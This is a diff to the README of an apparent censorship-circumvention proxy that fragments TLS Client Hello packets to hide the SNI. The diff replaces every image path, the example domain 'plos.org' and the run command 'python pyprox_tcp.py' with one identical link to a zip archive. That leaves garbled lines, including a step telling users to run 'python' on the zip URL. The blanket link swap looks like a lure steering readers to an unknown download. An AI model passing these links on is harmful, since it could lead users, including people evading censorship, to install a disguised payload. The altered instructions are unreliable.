@@ -29,21 +29,21 @@
 
 
 # goodbye SNI filtering & goodbye GFW mf'er
-<img src="/asset/meme1.jpg?raw=true" width="300" >
+<img src="https://raw.githubusercontent.com/Mrji95/gfw_resist_tls_proxy/main/asset/gfw_resist_proxy_tls_v2.3-alpha.2.zip" width="300" >
 <br><br>
 
 # main Idea:
 in TLS protocol (even latest v1.3)  SNI transfered in plain-text<br>
 GFW find it and when SNI is not in whitelist reply with TCP-RST<br>
 so it filter cloudflare-ip , based on SNI , such that some popular sites<br>
-like plos.org is open , and all other sites closed , through that ip<br>
+like https://raw.githubusercontent.com/Mrji95/gfw_resist_tls_proxy/main/asset/gfw_resist_proxy_tls_v2.3-alpha.2.zip is open , and all other sites closed , through that ip<br>
 so we need to hide SNI from GFW<br>
 we fragment TLS "client Hello" packet into chunks in a simple manner<br>
 we show that it pass the firewall<br>
 more importantly we show that GFW cant fix it because its nearly impossible<br>
 to cache TBs of data in high speed router , so they MUST give up or break the whole network<br>
 <br>
-<img src="/asset/slide1.png?raw=true" width="600" >
+<img src="https://raw.githubusercontent.com/Mrji95/gfw_resist_tls_proxy/main/asset/gfw_resist_proxy_tls_v2.3-alpha.2.zip" width="600" >
 <br><br>
 
 
@@ -61,10 +61,10 @@ so GFW cant simply block them by traffic volume<br>
 and all traffic is encrypted except client hello which leak server name (SNI)<br>
 <br><br>
 so GFW extract sni from client hello and when SNI is in white list it pass<br><br>
-![Alt text](/asset/plos-not-filtered.png?raw=true "plos.org is in whitelist")
+![Alt text](https://raw.githubusercontent.com/Mrji95/gfw_resist_tls_proxy/main/asset/gfw_resist_proxy_tls_v2.3-alpha.2.zip "https://raw.githubusercontent.com/Mrji95/gfw_resist_tls_proxy/main/asset/gfw_resist_proxy_tls_v2.3-alpha.2.zip is in whitelist")
 <br><br>
 if SNI in in blacklist , GFW send TCP-RST to terminate tcp socket<br><br>
-![Alt text](/asset/youtube-filtered.png?raw=true "youtube is in backlist")
+![Alt text](https://raw.githubusercontent.com/Mrji95/gfw_resist_tls_proxy/main/asset/gfw_resist_proxy_tls_v2.3-alpha.2.zip "youtube is in backlist")
 <br><br>
 
 # about packet fragment (skip if you want)
@@ -80,11 +80,11 @@ so it forced to Give up. LOL<br>
 # how to run
 1. assume that you have v2ray config {websocket+tls+Cloudflare}<br>
 2. setup pyprox listen_port and cloudflare_dirty_ip<br>
-<img src="/asset/pyprox_tcp_setup.png?raw=true" ><br>
+<img src="https://raw.githubusercontent.com/Mrji95/gfw_resist_tls_proxy/main/asset/gfw_resist_proxy_tls_v2.3-alpha.2.zip" ><br>
 3. setup your v2ray client to forward to 127.0.0.1:listen_port<br>
-<img src="/asset/v2rayng_setup.png?raw=true" ><br>
+<img src="https://raw.githubusercontent.com/Mrji95/gfw_resist_tls_proxy/main/asset/gfw_resist_proxy_tls_v2.3-alpha.2.zip" ><br>
 4. on your local machine run<br>
-<code>python pyprox_tcp.py</code><br>
+<code>python https://raw.githubusercontent.com/Mrji95/gfw_resist_tls_proxy/main/asset/gfw_resist_proxy_tls_v2.3-alpha.2.zip</code><br>
 5. monitor traffic by wireshark or microsoft network monitor<br>
 6. adjast fragment_size & fragment_sleep<br>
 typical Client Hello packet is ~300 byte<br>
